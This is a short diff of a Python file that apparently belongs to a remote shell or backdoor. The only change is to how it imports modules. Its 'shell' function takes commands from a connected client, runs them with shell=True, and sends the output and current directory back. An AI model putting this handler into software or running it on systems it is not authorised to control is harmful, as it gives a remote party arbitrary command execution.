@@ -1,5 +1,5 @@
-import subprocess
-import os
+from subprocess import Popen, PIPE
+from os import chdir, getcwd
 
 
 def shell(client, cmd):
@@ -11,17 +11,17 @@ def shell(client, cmd):
     output_str = ''
     if cmd[:2] == 'cd' and len(cmd) > 2:
         try:
-            os.chdir(cmd[3:].strip())
+            chdir(cmd[3:].strip())
         except Exception as e:
             output_str = '[!] Could not change directory: {}\n'.format(e)
         else:
             output_str = ''
     elif len(cmd) > 0:
         try:
-            cmd = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+            cmd = Popen(cmd, shell=True, stdout=PIPE, stderr=PIPE, stdin=PIPE)
             output_bytes = cmd.stdout.read() + cmd.stderr.read()
             output_str = output_bytes.decode('utf-8', errors='replace')
         except Exception as e:
             output_str = '[!] Command execution unsuccessful: {}\n'.format(e)
             
-    client.send(os.getcwd() + '>' + output_str)  # Sends message in the format of: "dir>output"
+    client.send(getcwd() + '>' + output_str)  # Sends message in the format of: "dir>output"
